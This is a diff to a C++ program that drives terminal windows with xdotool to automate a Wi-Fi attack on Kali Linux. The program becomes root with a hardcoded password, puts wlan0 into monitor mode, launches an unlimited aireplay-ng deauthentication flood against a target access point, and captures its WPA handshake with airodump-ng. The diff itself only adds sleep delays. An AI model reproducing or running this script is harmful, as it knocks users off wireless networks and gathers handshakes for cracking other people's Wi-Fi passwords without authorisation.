@@ -7,8 +7,11 @@ int main() {
 
 // access the root permission
     std::system("xdotool type \"sudo su\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
 
     std::system("sleep 1");
@@ -17,27 +20,35 @@ int main() {
     std::system("sleep 1");
     
     std::system("xdotool type \"airmon-ng start wlan0\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
-
+    std::system("sleep 1");
 // Playing deauthcaution attack on the wifi
     std::system("xdotool type \"sudo aireplay-ng --deauth 0 -a (bssid) wlan0\"");
 
 
 // capturing handshake of the wifi
+    std::system("sleep 1");
     std::system("x-terminal-emulator &");
     std::system("sleep 1");
     
     // access the root permission
+    std::system("sleep 1");
     std::system("xdotool type \"sudo su\"");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
-
+    std::system("sleep 1");
+    
     std::system("xdotool type \"cd /home/kali/wifi\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"sudo airodump-ng -w (hack1) -c (2) --bssid (bssid) wlan0\"");
 
-
+    std::system("sleep 1");
     std::system("x-terminal-emulator &");
     std::system("sleep 1");
 
@@ -45,12 +56,18 @@ int main() {
     std::system("sleep 1");
     
     // access the root permission
+    std::system("sleep 1");
     std::system("xdotool type \"sudo su\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
     std::system("xdotool type \"kali\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
+    std::system("sleep 1");
 
     std::system("xdotool type \"sudo airodump-ng wlan0\"");
+    std::system("sleep 1");
     std::system("xdotool key Return");
     
     return 0;
